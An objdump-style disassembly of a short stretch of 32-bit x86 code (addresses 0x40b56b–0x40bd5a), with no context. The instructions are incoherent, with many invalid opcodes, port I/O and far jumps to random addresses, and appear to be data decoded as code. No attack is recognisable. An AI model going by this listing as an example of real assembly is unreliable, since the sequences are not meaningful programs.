  40b56b:	pop    es
  40b56c:	loope  0x40b576
  40b56e:	cmc    
  40b56f:	inc    BYTE PTR [edx]
  40b571:	enter  0xccf,0x8
  40b575:	mov    edi,0xf1f5c1aa
  40b57a:	out    dx,eax
  40b57b:	ret    
  40b57c:	ret    0xceb4
  40b57f:	in     al,0xbb
  40b581:	mov    edi,0xf3ded0b6
  40b586:	out    0xef,eax
  40b588:	out    0xf7,al
  40b58a:	mov    edx,0xebffc305
  40b58f:	loop   0x40b585
  40b591:	aad    0x13
  40b593:	psllw  mm5,mm1
  40b596:	lods   al,BYTE PTR ds:[esi]
  40b597:	jmp    0x40b546
  40b599:	ror    esp,cl
  40b59b:	xlat   BYTE PTR ds:[ebx]
  40b59c:	repnz iret 
  40b59e:	iret   
  40b59f:	call   0xfc0b6a5a
  40b5a4:	add    ch,bh
  40b5a6:	fdiv   QWORD PTR [ebp-0x141c020c]
  40b5ac:	add    al,0xca
  40b5ae:	hlt    
  40b5af:	or     dh,dh
  40b5b1:	loopne 0x40b57e
  40b5b3:	into   
  40b5b4:	adc    ecx,esi
  40b5b6:	int3   
  40b5b7:	mov    ebp,0xcecbc3bd
  40b5bc:	fcmovnbe st,st(5)
  40b5be:	(bad)  
  40b5bf:	lods   eax,DWORD PTR ds:[esi]
  40b5c0:	fcmovnu st,st(5)
  40b5c2:	(bad)  
  40b5c3:	mov    ebp,0xf802f0ee
  40b5c8:	loop   0x40b59f
  40b5ca:	stc    
  40b5cb:	repz jmp 0x1c8:0x1e8e9db
  40b5d3:	in     al,dx
  40b5d4:	into   
  40b5d5:	jmp    0xcef892c0
  40b5da:	mov    al,0xb3
  40b5dc:	int    0xbb
  40b5de:	enter  0xbaff,0xba
  40b5e2:	idiv   DWORD PTR [edx-0x8221e03]
  40b5e8:	cli    
  40b5e9:	out    0xfb,eax
  40b5eb:	lock jmp 0xe718aab2
  40b5f1:	sti    
  40b5f2:	add    DWORD PTR [edx],ecx
  40b5f4:	push   DWORD PTR [ecx-0x493d1d0f]
  40b5fa:	(bad)  
  40b5fb:	call   0xd640a6cc
  40b600:	in     al,dx
  40b601:	(bad)  
  40b602:	repz fdivr DWORD PTR [edx-0x260d2c10]
  40b609:	in     al,dx
  40b60a:	fdiv   st,st(0)
  40b60c:	(bad)  
  40b60e:	cld    
  40b60f:	add    al,0xe4
  40b611:	out    dx,eax
  40b612:	fscale 
  40b614:	or     edx,eax
  40b616:	int    0xc7
  40b618:	(bad)  [ebp+eax*8-0xc1b384b]
  40b61f:	mov    ebx,0xf5eeeac4
  40b624:	aad    0xb8
  40b626:	into   
  40b627:	int3   
  40b628:	fdivrp st(0),st
  40b62a:	shl    dl,cl
  40b62c:	sti    
  40b62d:	jecxz  0x40b625
  40b62f:	cmc    
  40b630:	leave  
  40b631:	into   
  40b632:	or     eax,0xf1c0f1ef
  40b637:	repnz aad 0xf3
  40b63a:	out    0xd3,eax
  40b63c:	mov    ch,0xd8
  40b63e:	mov    al,0xe9
  40b640:	clc    
  40b641:	in     al,0xdf
  40b643:	int3   
  40b644:	call   0xfb049f44
  40b649:	mov    esi,0x3f202c1
  40b64e:	add    esi,edi
  40b650:	fadd   DWORD PTR [eax]
  40b652:	inc    BYTE PTR [ebx]
  40b654:	or     esi,edx
  40b656:	out    dx,al
  40b657:	jmp    0xcbc5:0xfae7d1c9
  40b65e:	out    dx,eax
  40b65f:	out    0xfe,eax
  40b661:	rcl    ecx,cl
  40b663:	mov    cl,0xbd
  40b665:	loopne 0x40b633
  40b667:	mov    ecx,0xf4c3f007
  40b66c:	aad    0xe9
  40b66e:	fdivr  DWORD PTR [ebp-0x5171703]
  40b674:	shl    bh,cl
  40b676:	shl    BYTE PTR [edx-0x361b2d35],cl
  40b67c:	mov    al,0xcf
  40b67e:	repz cmc 
  40b680:	std    
  40b681:	retf   0xcffa
  40b684:	xlat   BYTE PTR ds:[ebx]
  40b685:	xlat   BYTE PTR ds:[ebx]
  40b686:	int    0xfb
  40b688:	sti    
  40b689:	lock in eax,0xbd
  40b68c:	or     eax,eax
  40b68e:	shr    bl,0xe3
  40b691:	pop    es
  40b692:	call   0xa9ff8166
  40b697:	loopne 0x40b655
  40b699:	out    0xd0,al
  40b69b:	leave  
  40b69c:	loop   0x40b67f
  40b69e:	aad    0xdf
  40b6a0:	mov    edx,0xe3eaeac9
  40b6a5:	xlat   BYTE PTR ds:[ebx]
  40b6a6:	shl    al,1
  40b6a8:	repnz shl eax,cl
  40b6ab:	rol    dh,1
  40b6ad:	xlat   BYTE PTR ds:[ebx]
  40b6ae:	cmc    
  40b6af:	fucom  st(4)
  40b6b1:	cld    
  40b6b2:	enter  0xd2cf,0xf2
  40b6b6:	call   0xb1297467
  40b6bb:	in     al,0xfb
  40b6bd:	stc    
  40b6be:	repnz mov eax,0x203e9de
  40b6c4:	sar    dl,cl
  40b6c6:	jecxz  0x40b694
  40b6c8:	out    dx,al
  40b6c9:	fld    DWORD PTR [eax]
  40b6cb:	add    esp,ebx
  40b6cd:	aad    0xd4
  40b6cf:	cli    
  40b6d0:	fcos   
  40b6d2:	sti    
  40b6d3:	jmp    0xed1084c2
  40b6d8:	fsubp  st(5),st
  40b6da:	hlt    
  40b6db:	(bad)  
  40b6dc:	fpatan 
  40b6de:	in     al,dx
  40b6df:	fucomi st,st(3)
  40b6e1:	mov    dh,0xd9
  40b6e3:	retf   
  40b6e4:	mov    al,0xbe
  40b6e6:	(bad)  
  40b6e8:	clc    
  40b6e9:	ret    0xc5f9
  40b6ec:	pop    es
  40b6ed:	hlt    
  40b6ee:	cmc    
  40b6ef:	retf   0x7e3
  40b6f2:	(bad)  
  40b6f3:	loop   0x40b6d2
  40b6f5:	leave  
  40b6f6:	loope  0x40b6bc
  40b6f8:	mov    cl,0xc9
  40b6fa:	out    0xd7,eax
  40b6fc:	out    dx,al
  40b6fd:	shr    eax,cl
  40b6ff:	out    0xd8,al
  40b701:	div    edx
  40b703:	repnz fcmovbe st,st(4)
  40b706:	loope  0x40b6f7
  40b708:	(bad)  
  40b709:	icebp  
  40b70a:	(bad)  
  40b70b:	sti    
  40b70c:	fld    st(3)
  40b70e:	call   0x1015b9f1
  40b713:	out    0xc9,eax
  40b715:	fadd   st(5),st
  40b717:	icebp  
  40b718:	scas   al,BYTE PTR es:[edi]
  40b719:	mul    al
  40b71b:	loop   0x40b6e5
  40b71d:	in     al,dx
  40b71e:	enter  0xd6db,0xd5
  40b722:	in     al,0xf6
  40b724:	div    esp
  40b726:	into   
  40b727:	xlat   BYTE PTR ds:[ebx]
  40b728:	in     eax,0xbd
  40b72a:	loope  0x40b729
  40b72c:	cli    
  40b72d:	in     eax,0xe9
  40b72f:	les    ecx,FWORD PTR [eax]
  40b731:	in     al,dx
  40b732:	add    eax,0xa8c5e4c9
  40b737:	int3   
  40b738:	in     eax,dx
  40b739:	mov    dh,0xd7
  40b73b:	in     eax,dx
  40b73c:	leave  
  40b73d:	cmc    
  40b73e:	sar    dh,cl
  40b740:	(bad)  
  40b742:	dec    cl
  40b744:	mov    ecx,0xccd3eebd
  40b749:	lock rcl ecx,0xf2
  40b74d:	add    cl,bl
  40b74f:	rcr    al,0xd8
  40b752:	fucomip st,st(0)
  40b754:	loopne 0x40b715
  40b756:	iret   
  40b757:	lods   eax,DWORD PTR ds:[esi]
  40b758:	icebp  
  40b759:	hlt    
  40b75a:	mov    al,0xd7
  40b75c:	call   0xcc1b7832
  40b761:	mov    bh,0xcd
  40b763:	(bad)  
  40b765:	fstp   TBYTE PTR [eax-0xd13f93d]
  40b76b:	cld    
  40b76c:	push   es
  40b76d:	test   DWORD PTR [edx],0xe6de0bd6
  40b773:	or     ecx,ebx
  40b775:	mov    bl,0xce
  40b777:	mov    edi,0xeed6f1ed
  40b77c:	int3   
  40b77d:	shl    edx,0xe7
  40b780:	out    dx,al
  40b781:	(bad)  
  40b782:	hlt    
  40b783:	ret    
  40b784:	in     eax,dx
  40b785:	out    dx,eax
  40b786:	icebp  
  40b787:	ret    
  40b788:	cld    
  40b789:	ffreep st(3)
  40b78b:	(bad)  
  40b78c:	retf   0xe6fa
  40b78f:	shl    dh,0xfc
  40b792:	add    al,0xc9
  40b794:	loopne 0x40b75b
  40b796:	mov    edi,0xf2d3efea
  40b79b:	iret   
  40b79c:	stc    
  40b79d:	aam    0xcb
  40b79f:	mov    al,0xd4
  40b7a1:	les    edi,FWORD PTR [eax-0x2053d30]
  40b7a7:	into   
  40b7a8:	fld    DWORD PTR ds:0xf7f40b06
  40b7ae:	add    cl,bl
  40b7b0:	(bad)  
  40b7b2:	iret   
  40b7b3:	or     eax,0xdfe2bc11
  40b7b8:	mov    al,0xb5
  40b7ba:	lods   eax,DWORD PTR ds:[esi]
  40b7bb:	mov    dl,0xba
  40b7bd:	mov    edx,0xccddb6f4
  40b7c2:	jmp    0x40b7c6
  40b7c4:	jecxz  0x40b7b7
  40b7c6:	std    
  40b7c7:	out    dx,al
  40b7c8:	clc    
  40b7c9:	lock add eax,esi
  40b7cc:	add    edx,ecx
  40b7ce:	loopne 0x40b7da
  40b7d0:	in     eax,0xe8
  40b7d2:	loopne 0x40b798
  40b7d4:	pop    es
  40b7d5:	rcr    dh,1
  40b7d7:	lods   eax,DWORD PTR ds:[esi]
  40b7d8:	(bad)  
  40b7d9:	call   0xb80c8e93
  40b7de:	(bad)  
  40b7df:	mov    al,0xf7
  40b7e1:	in     al,dx
  40b7e2:	std    
  40b7e3:	iret   
  40b7e4:	aam    0xd6
  40b7e6:	hlt    
  40b7e7:	repnz push es
  40b7e9:	mov    esi,0xe201f1fb
  40b7ee:	ret    0xe7d5
  40b7f1:	faddp  st(6),st
  40b7f3:	add    eax,eax
  40b7f5:	jmp    0xc1c0:0xe2d0e3d3
  40b7fc:	icebp  
  40b7fd:	mov    al,0xf7
  40b7ff:	mov    cl,0xc5
  40b801:	(bad)  
  40b803:	mov    edx,0xc7cce2f0
  40b808:	out    0x7,eax
  40b80a:	xlat   BYTE PTR ds:[ebx]
  40b80b:	(bad)  
  40b80c:	cld    
  40b80d:	loope  0x40b80f
  40b80f:	cmc    
  40b810:	out    0xed,eax
  40b812:	retf   
  40b813:	pop    es
  40b814:	or     dl,al
  40b816:	mov    eax,0xf1b2aceb
  40b81b:	out    dx,eax
  40b81c:	repnz ror bl,1
  40b81f:	rcl    eax,cl
  40b821:	mov    ch,0xdb
  40b823:	mov    ch,0xc2
  40b825:	enter  0xf8f3,0xe6
  40b829:	shl    dh,1
  40b82b:	jmp    0x40b807
  40b82d:	fcmovb st,st(0)
  40b82f:	jmp    0xc0ec:0xe6f8cbf4
  40b836:	loop   0x40b7f6
  40b838:	sar    DWORD PTR [ebp-0x264b0d53],0xf0
  40b83f:	mov    ebx,0xdfd7dadd
  40b844:	inc    bl
  40b846:	int    0xf2
  40b848:	cld    
  40b849:	(bad)  
  40b84b:	ror    dl,cl
  40b84d:	(bad)  
  40b84e:	(bad)  
  40b84f:	or     dh,cl
  40b851:	std    
  40b852:	fld    st(1)
  40b854:	or     eax,0xf1cfaec9
  40b859:	cmc    
  40b85a:	mov    bh,0xd7
  40b85c:	enter  0xd9d3,0xe5
  40b860:	neg    ch
  40b862:	into   
  40b863:	fmul   st,st(2)
  40b865:	fdiv   st,st(5)
  40b867:	loope  0x40b84a
  40b869:	shl    edx,0xe7
  40b86c:	mov    esp,0x4bdf8d1
  40b871:	push   cs
  40b872:	jmp    0xc91db257
  40b877:	in     al,0xf6
  40b879:	ror    al,cl
  40b87b:	test   eax,0xb0c8c7cb
  40b880:	fcomp  st(0)
  40b882:	add    ecx,ecx
  40b884:	mov    ebp,0xfed4d6e8
  40b889:	aam    0xc4
  40b88b:	lock add eax,0xffd9ef0b
  40b891:	stc    
  40b892:	cli    
  40b893:	fimul  WORD PTR [eax]
  40b895:	mov    ebp,0xf3f7c2f0
  40b89a:	mov    bl,0xf2
  40b89c:	mov    ebx,0xefead8af
  40b8a1:	(bad)  
  40b8a2:	out    dx,al
  40b8a3:	std    
  40b8a4:	add    edi,ebp
  40b8a6:	mov    edx,0xf207d0f3
  40b8ab:	out    0xca,al
  40b8ad:	cli    
  40b8ae:	jmp    0x50d:0xeae2e2e7
  40b8b5:	scas   al,BYTE PTR es:[edi]
  40b8b6:	mov    eax,0xc5e1d1eb
  40b8bb:	retf   
  40b8bc:	retf   0xe8ec
  40b8bf:	cli    
  40b8c0:	mov    ecx,0xdfbebeca
  40b8c5:	fnstcw WORD PTR [edi-0x33003102]
  40b8cb:	add    edi,edx
  40b8cd:	ret    
  40b8ce:	jecxz  0x40b899
  40b8d0:	jmp    0xb1bc:0xfe113c8
  40b8d7:	enter  0xf4ef,0xb4
  40b8db:	loop   0x40b894
  40b8dd:	out    0xbb,eax
  40b8df:	mov    edx,0xf0ccb8c4
  40b8e4:	fcomip st,st(7)
  40b8e6:	out    dx,al
  40b8e7:	add    al,dh
  40b8e9:	loopne 0x40b8a5
  40b8eb:	ret    0xf5fc
  40b8ee:	shr    cl,0xe6
  40b8f1:	push   cs
  40b8f2:	or     al,0x1
  40b8f4:	into   
  40b8f5:	test   al,0xf1
  40b8f7:	(bad)  
  40b8f8:	out    dx,eax
  40b8f9:	rcl    eax,cl
  40b8fb:	(bad)  [ebx+ecx*8-0x24284820]
  40b902:	aad    0xdd
  40b904:	sar    DWORD PTR [ebx-0x2bfe1f12],cl
  40b90a:	(bad)  
  40b90c:	jmp    0xe30cadd3
  40b911:	out    0xc,al
  40b913:	or     edx,edx
  40b915:	fdivrp st(1),st
  40b917:	mov    al,0xca
  40b919:	int3   
  40b91a:	lock lock mov edx,0xf9e9d8d6
  40b921:	in     al,dx
  40b922:	std    
  40b923:	mov    cl,0xd6
  40b925:	mov    ebx,0xbc05e7ff
  40b92a:	(bad)
  40b92e:	or     dl,cl
  40b930:	pop    es
  40b931:	aam    0xfe
  40b933:	int3   
  40b934:	rcr    cl,cl
  40b936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b937:	mov    dl,0xd5
  40b939:	in     eax,dx
  40b93a:	mov    esp,0xdab7b4f0
  40b93f:	faddp  st(4),st
  40b941:	in     eax,dx
  40b942:	clc    
  40b943:	fstp   TBYTE PTR [edx+0x1d6dc00]
  40b949:	in     eax,0x6
  40b94b:	repz loop 0x40b919
  40b94e:	dec    bl
  40b950:	retf   0xfc06
  40b953:	in     al,dx
  40b954:	fidivr WORD PTR [eax-0x3b0a5221]
  40b95a:	stos   BYTE PTR es:[edi],al
  40b95b:	out    dx,al
  40b95c:	mov    cl,0xe9
  40b95e:	lock fmulp st(5),st
  40b961:	xlat   BYTE PTR ds:[ebx]
  40b962:	in     al,dx
  40b963:	enter  0xccd1,0xcf
  40b967:	ret    0x2c7
  40b96a:	fadd   DWORD PTR [esi+eiz*8]
  40b96d:	stc    
  40b96e:	add    dh,al
  40b970:	loop   0x40b95c
  40b972:	push   cs
  40b973:	push   es
  40b974:	(bad)  
  40b976:	jmp    0x40b968
  40b978:	rol    ch,0xdc
  40b97b:	into   
  40b97c:	mov    ah,0xb9
  40b97e:	fldpi  
  40b980:	rcl    esi,1
  40b982:	mov    ebx,0xecbacddb
  40b987:	out    dx,al
  40b988:	in     al,dx
  40b989:	mov    esi,0xd7060105
  40b98e:	(bad)  
  40b98f:	jecxz  0x40b969
  40b991:	loope  0x40b998
  40b993:	pop    es
  40b994:	retf   
  40b995:	fnstcw WORD PTR [ebp-0x163f3c3b]
  40b99b:	mov    cl,0xb1
  40b99d:	out    dx,al
  40b99e:	(bad)  
  40b99f:	(bad)  
  40b9a0:	mov    al,0xef
  40b9a2:	mov    ebx,0xf9f1b0f1
  40b9a7:	out    dx,eax
  40b9a8:	out    0xe7,eax
  40b9aa:	add    dh,dl
  40b9ac:	add    edx,ecx
  40b9ae:	aad    0xcf
  40b9b0:	add    ecx,ebp
  40b9b2:	ret    0xfe03
  40b9b5:	int3   
  40b9b6:	lods   eax,DWORD PTR ds:[esi]
  40b9b7:	out    0xa8,eax
  40b9b9:	aam    0xcd
  40b9bb:	mov    bh,0xed
  40b9bd:	scas   eax,DWORD PTR es:[edi]
  40b9be:	(bad)
  40b9c1:	cld    
  40b9c2:	sti    
  40b9c3:	hlt    
  40b9c4:	mul    bl
  40b9c6:	loope  0x40b9c5
  40b9c8:	cmc    
  40b9c9:	div    ebp
  40b9cb:	(bad)  
  40b9cd:	(bad)  
  40b9ce:	retf   
  40b9cf:	or     al,BYTE PTR ds:0xedd3c6e0
  40b9d5:	loope  0x40b99d
  40b9d7:	iret   
  40b9d8:	cmc    
  40b9d9:	lds    esi,FWORD PTR [edi-0x2c350516]
  40b9df:	(bad)  
  40b9e0:	shr    cl,1
  40b9e2:	mov    eax,0xb8c8f1e8
  40b9e7:	in     eax,dx
  40b9e8:	(bad)  
  40b9e9:	ret    
  40b9ea:	sti    
  40b9eb:	(bad)  
  40b9ec:	fadd   st(6),st
  40b9ee:	sar    edx,0x3
  40b9f1:	out    0xfe,eax
  40b9f3:	fmul   QWORD PTR [ebx]
  40b9f5:	fmulp  st(2),st
  40b9f7:	lods   eax,DWORD PTR ds:[esi]
  40b9f8:	repz int 0xd3
  40b9fb:	cli    
  40b9fc:	cmc    
  40b9fd:	not    ch
  40b9ff:	stc    
  40ba00:	aam    0xd5
  40ba02:	sar    ebp,cl
  40ba04:	std    
  40ba05:	mov    esp,0x7d5e202
  40ba0a:	mov    edx,0x607f7d8
  40ba0f:	test   ebp,0xeaec0fc4
  40ba15:	loopne 0x40b9f3
  40ba17:	in     al,0xcd
  40ba19:	aad    0xb4
  40ba1b:	cli    
  40ba1c:	aad    0xe1
  40ba1e:	rcl    al,cl
  40ba20:	xlat   BYTE PTR ds:[ebx]
  40ba21:	mov    ch,0xee
  40ba23:	shl    dh,1
  40ba25:	lock sti 
  40ba27:	fsubp  st(6),st
  40ba29:	in     al,0xe6
  40ba2b:	fsub   st,st(1)
  40ba2d:	mov    edi,0xf806e9c2
  40ba32:	add    ch,ah
  40ba34:	shr    ch,cl
  40ba36:	into   
  40ba37:	ret    0xc5b0
  40ba3a:	lock jecxz 0x40ba23
  40ba3d:	shl    BYTE PTR [edx-0x11084f17],cl
  40ba43:	mov    ebx,0xc0c0bec8
  40ba48:	out    dx,al
  40ba49:	repz inc edx
  40ba4c:	repnz hlt 
  40ba4e:	shl    dh,1
  40ba50:	jmp    0xe0e6:0x13dfcc0b
  40ba57:	in     eax,dx
  40ba58:	retf   
  40ba59:	(bad)
  40ba5c:	enter  0xbbb4,0xe7
  40ba60:	iret   
  40ba61:	shl    DWORD PTR [ebp+0x2ece2fb],cl
  40ba67:	into   
  40ba68:	loop   0x40ba2c
  40ba6a:	std    
  40ba6b:	mov    ecx,0xe5e5c1ea
  40ba70:	rol    BYTE PTR [ecx],0xfc
  40ba73:	add    al,0xdf
  40ba75:	mov    ebp,0xb6e5c6c0
  40ba7a:	scas   al,BYTE PTR es:[edi]
  40ba7b:	mov    al,0xb2
  40ba7d:	test   eax,0xbbe9f4ee
  40ba83:	in     eax,dx
  40ba84:	clc    
  40ba85:	fidivr DWORD PTR [ebp-0x41020b29]
  40ba8b:	lock add al,dl
  40ba8e:	or     dh,dh
  40ba90:	fild   WORD PTR [eax]
  40ba92:	loopne 0x40ba6d
  40ba94:	shr    dh,0xbf
  40ba97:	shl    ebx,1
  40ba99:	out    0xe7,eax
  40ba9b:	call   0xcd309592
  40baa0:	int3   
  40baa1:	iret   
  40baa2:	test   edx,0xdddbfebf
  40baa8:	int    0xfd
  40baaa:	rcl    dh,cl
  40baac:	jmp    0x40baa6
  40baae:	hlt    
  40baaf:	call   0xe4f939b
  40bab4:	in     eax,dx
  40bab5:	shl    dl,cl
  40bab7:	in     eax,0xcd
  40bab9:	int3   
  40baba:	into   
  40babb:	ret    0xd4e5
  40babe:	mov    ecx,0xbdebb9f6
  40bac3:	retf   0xcedb
  40bac6:	int    0xe6
  40bac8:	add    bl,ch
  40baca:	(bad)  
  40bacb:	aad    0xdc
  40bacd:	cli    
  40bace:	(bad)  
  40bacf:	(bad)  
  40bad1:	(bad)  
  40bad3:	add    esi,edi
  40bad5:	retf   
  40bad6:	shr    esi,0xbd
  40bad9:	out    dx,al
  40bada:	in     al,0xf5
  40badc:	int    0xcb
  40bade:	repz shl edi,cl
  40bae1:	fdiv   QWORD PTR [esp+edi*8-0x47280933]
  40bae8:	repnz (bad) 
  40baea:	fadd   st(0),st
  40baec:	in     al,0xe5
  40baee:	fisttp DWORD PTR [edx]
  40baf0:	or     cl,BYTE PTR [esp+esi*8]
  40baf3:	retf   
  40baf4:	rcr    cl,cl
  40baf6:	lods   eax,DWORD PTR ds:[esi]
  40baf7:	out    0xae,eax
  40baf9:	jmp    0xe9ea:0xdbbad4f4
  40bb00:	std    
  40bb01:	jmp    0xd8da:0xd1f8b8fa
  40bb08:	(bad)  
  40bb09:	mov    ebp,0xdae2dc00
  40bb0e:	(bad)  
  40bb10:	add    bh,bl
  40bb12:	in     eax,dx
  40bb13:	leave  
  40bb14:	into   
  40bb15:	fldcw  WORD PTR [edx-0xf4d1c1c]
  40bb1b:	retf   
  40bb1c:	cli    
  40bb1d:	sti    
  40bb1e:	(bad)  
  40bb20:	(bad)  
  40bb22:	mov    esp,0xc0bee103
  40bb27:	out    dx,eax
  40bb28:	repz mov esp,0xe2e8e3f2
  40bb2f:	mov    ebp,0xdaea00d8
  40bb34:	adc    al,cl
  40bb36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb37:	ret    
  40bb38:	repnz in eax,dx
  40bb3a:	(bad)  
  40bb3b:	in     eax,dx
  40bb3c:	imul   edi
  40bb3e:	xlat   BYTE PTR ds:[ebx]
  40bb3f:	lock call edx
  40bb42:	mov    ebp,0xf6dac9fd
  40bb47:	fucomp st(5)
  40bb49:	aad    0x1
  40bb4b:	add    esp,ebx
  40bb4d:	jecxz  0x40bb32
  40bb4f:	(bad)  
  40bb50:	or     ah,al
  40bb52:	in     al,dx
  40bb53:	or     ch,cl
  40bb55:	repnz mov eax,0xbcefe3e8
  40bb5b:	fcmovu st,st(1)
  40bb5d:	(bad)  
  40bb5e:	clc    
  40bb5f:	call   0xfe1d9862
  40bb64:	out    dx,eax
  40bb65:	mov    ecx,0xe0fbdbcf
  40bb6a:	loopne 0x40bb3c
  40bb6c:	ret    0xbe02
  40bb6f:	jmp    0x40bb4f
  40bb71:	std    
  40bb72:	(bad)  
  40bb73:	rcl    edx,cl
  40bb75:	out    dx,al
  40bb76:	stos   BYTE PTR es:[edi],al
  40bb77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb78:	(bad)
  40bb7b:	cli    
  40bb7c:	shl    esp,1
  40bb7e:	clc    
  40bb7f:	mov    edx,0xdad3e4f5
  40bb84:	mov    ebp,0xdcedf1c8
  40bb89:	test   dl,0xd5
  40bb8c:	jmp    0x40bb63
  40bb8e:	test   edi,0xe8c8ffdf
  40bb94:	shr    BYTE PTR [ebx-0x4f432c4d],cl
  40bb9a:	mov    esp,0xf6f6d2e6
  40bb9f:	fcomp  st(3)
  40bba1:	out    dx,eax
  40bba2:	aad    0xfd
  40bba4:	mov    ah,0xfc
  40bba6:	pop    es
  40bba7:	mov    edi,0xf2fec7
  40bbac:	jmp    0x13fa789
  40bbb1:	cld    
  40bbb2:	sti    
  40bbb3:	rcl    ebx,0xac
  40bbb6:	(bad)  
  40bbb8:	iret   
  40bbb9:	repnz shl ah,0xb4
  40bbbd:	in     eax,dx
  40bbbe:	fcmove st,st(0)
  40bbc0:	in     al,0xcc
  40bbc2:	call   0xf6feb5b3
  40bbc7:	int3   
  40bbc8:	repz add eax,edi
  40bbcb:	fdivp  st(7),st
  40bbcd:	retf   0xc9c6
  40bbd0:	out    0xc3,al
  40bbd2:	add    eax,0xdfdfedd3
  40bbd7:	in     al,0xc3
  40bbd9:	in     al,0xe7
  40bbdb:	retf   
  40bbdc:	hlt    
  40bbdd:	(bad)  
  40bbde:	retf   
  40bbdf:	retf   0xb3b0
  40bbe2:	retf   0xb0ce
  40bbe5:	aad    0xce
  40bbe7:	add    ah,bh
  40bbe9:	fdiv   st(7),st
  40bbeb:	mov    esp,0xd5e2cbe4
  40bbf0:	in     eax,dx
  40bbf1:	or     ecx,DWORD PTR [ecx]
  40bbf3:	(bad)  
  40bbf5:	rcl    dl,1
  40bbf7:	out    dx,al
  40bbf8:	mov    esi,0xf3dad1c9
  40bbfd:	in     eax,dx
  40bbfe:	ror    bl,1
  40bc00:	(bad)
  40bc03:	jecxz  0x40bbbe
  40bc05:	loopne 0x40bbe6
  40bc07:	fild   WORD PTR ds:0xc2fbbdc0
  40bc0d:	cli    
  40bc0e:	(bad)  
  40bc0f:	cld    
  40bc10:	sti    
  40bc11:	or     cl,bh
  40bc13:	pop    es
  40bc14:	fucom  st(6)
  40bc16:	scas   eax,DWORD PTR es:[edi]
  40bc17:	in     eax,dx
  40bc18:	shl    ah,1
  40bc1a:	int    0xcb
  40bc1c:	hlt    
  40bc1d:	fdiv   st,st(1)
  40bc1f:	in     al,0xe6
  40bc21:	int3   
  40bc22:	jmp    0x40bc07
  40bc24:	jmp    0xb9048e08
  40bc29:	clc    
  40bc2a:	jmp    0x40bc0c
  40bc2c:	(bad)  
  40bc2e:	loop   0x40bc13
  40bc30:	fsubr  st,st(5)
  40bc32:	std    
  40bc33:	or     al,BYTE PTR [ecx+edi*4]
  40bc36:	rol    ebp,1
  40bc38:	mov    cl,0xd3
  40bc3a:	lods   al,BYTE PTR ds:[esi]
  40bc3b:	aam    0xdb
  40bc3d:	in     eax,dx
  40bc3e:	idiv   DWORD PTR [ebx-0x33210d21]
  40bc44:	out    dx,eax
  40bc45:	fidivr WORD PTR [ecx+edx*8-0x9413a3e]
  40bc4c:	jmp    0xe02c975b
  40bc51:	push   es
  40bc52:	std    
  40bc53:	(bad)  
  40bc55:	out    0xb8,al
  40bc57:	lods   al,BYTE PTR ds:[esi]
  40bc58:	iret   
  40bc59:	in     al,dx
  40bc5a:	enter  0xe2bb,0xf2
  40bc5e:	in     eax,dx
  40bc5f:	push   DWORD PTR [ebp+0x1fdedfa]
  40bc65:	fabs   
  40bc67:	aam    0xc6
  40bc69:	(bad)  
  40bc6a:	inc    ah
  40bc6c:	(bad)  
  40bc6d:	aad    0xc2
  40bc6f:	fdivp  st(0),st
  40bc71:	loope  0x40bc7a
  40bc73:	clc    
  40bc74:	leave  
  40bc75:	fsubr  st(4),st
  40bc77:	loope  0x40bc50
  40bc79:	icebp  
  40bc7a:	test   ecx,0xebfbefcc
  40bc80:	shr    dl,cl
  40bc82:	out    dx,al
  40bc83:	clc    
  40bc84:	aam    0xce
  40bc86:	jecxz  0x40bc8e
  40bc88:	ret    0xe4c6
  40bc8b:	fld    DWORD PTR [ebx]
  40bc8d:	cld    
  40bc8e:	aam    0xe9
  40bc90:	(bad)  
  40bc92:	jmp    0x40bc82
  40bc94:	cli    
  40bc95:	repnz mov ebp,0xe5c3afcc
  40bc9b:	mov    ebx,0xfad4c9da
  40bca0:	jmp    0xf437b262
  40bca5:	in     al,dx
  40bca6:	ffree  st(3)
  40bca8:	add    al,BYTE PTR [edi]
  40bcaa:	loop   0x40bc68
  40bcac:	not    ah
  40bcae:	std    
  40bcaf:	(bad)
  40bcb2:	retf   
  40bcb3:	out    0xeb,al
  40bcb5:	iret   
  40bcb6:	int3   
  40bcb7:	call   0xb32b8da5
  40bcbc:	mov    dl,0xb7
  40bcbe:	test   ebp,0xdef7f8f2
  40bcc4:	mov    al,0xdf
  40bcc6:	(bad)  
  40bcc7:	mov    edi,0xd2c5f8b4
  40bccc:	loope  0x40bc9e
  40bcce:	(bad)  
  40bcd0:	call   0xfd22a9ce
  40bcd5:	fdiv   st,st(0)
  40bcd7:	mov    cl,0xc4
  40bcd9:	ret    0xb7ec
  40bcdc:	mov    cl,0xd4
  40bcde:	clc    
  40bcdf:	in     al,0xe4
  40bce1:	aam    0xee
  40bce3:	shr    dl,1
  40bce5:	aam    0xe8
  40bce7:	out    0xe7,al
  40bce9:	(bad)  
  40bcea:	shl    esi,1
  40bcec:	fcmovu st,st(1)
  40bcee:	out    0x4,al
  40bcf0:	jecxz  0x40bcfc
  40bcf2:	std    
  40bcf3:	pop    es
  40bcf4:	or     cl,ch
  40bcf6:	mov    dl,0xd1
  40bcf8:	mov    bh,0xb6
  40bcfa:	mov    al,0xea
  40bcfc:	retf   0xbbd0
  40bcff:	aad    0xc5
  40bd01:	mov    edx,0xc8d0dd03
  40bd06:	int    0xe1
  40bd08:	int    0xfe
  40bd0a:	fneni(8087 only) 
  40bd0c:	rcr    edi,1
  40bd0e:	fcmovnbe st,st(4)
  40bd10:	(bad)  
  40bd12:	std    
  40bd13:	fild   DWORD PTR [edi]
  40bd15:	loop   0x40bcca
  40bd17:	loop   0x40bce0
  40bd19:	out    0xdb,al
  40bd1b:	ret    0xd4c2
  40bd1e:	jmp    0xccbc:0xd5d5b4de
  40bd25:	neg    cl
  40bd27:	cmc    
  40bd28:	mov    eax,0xf401f0e6
  40bd2d:	fisttp QWORD PTR [ecx]
  40bd2f:	add    esi,edx
  40bd31:	push   es
  40bd32:	or     eax,0xcce9eaee
  40bd37:	shr    eax,1
  40bd39:	test   ch,0xac
  40bd3c:	mov    dh,0xf3
  40bd3e:	repz xlat BYTE PTR ds:[ebx]
  40bd40:	fstp   TBYTE PTR [edx-0xb2e0532]
  40bd46:	loope  0x40bd2f
  40bd48:	cmc    
  40bd49:	cli    
  40bd4a:	fld    DWORD PTR ds:0xf9c6d1ea
  40bd50:	pop    es
  40bd51:	retf   
  40bd52:	in     eax,dx
  40bd53:	push   cs
  40bd54:	fdivr  QWORD PTR [ecx-0x13162950]
  40bd5a:	into   
